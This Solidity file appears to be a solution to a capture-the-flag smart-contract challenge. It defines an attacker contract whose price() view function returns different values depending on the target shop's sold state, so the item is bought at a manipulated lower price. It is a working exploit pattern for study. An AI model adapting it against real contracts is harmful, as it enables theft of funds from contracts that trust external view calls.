// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IBuyer, Shop} from "./Shop.sol";

contract ShopAttacker is IBuyer {
    Shop public immutable i_shop;
    bool public flip = false;

    constructor(address _shop) {
        i_shop = Shop(_shop);
    }

    function price() external view override returns (uint256) {
        bool isSold = i_shop.isSold();
        uint256 price = i_shop.price();
        if (!isSold) {
            return price + uint256(20);
        } else {
            return price - uint256(20);
        }
    }

    function attack() public {
        i_shop.buy();
    }
}
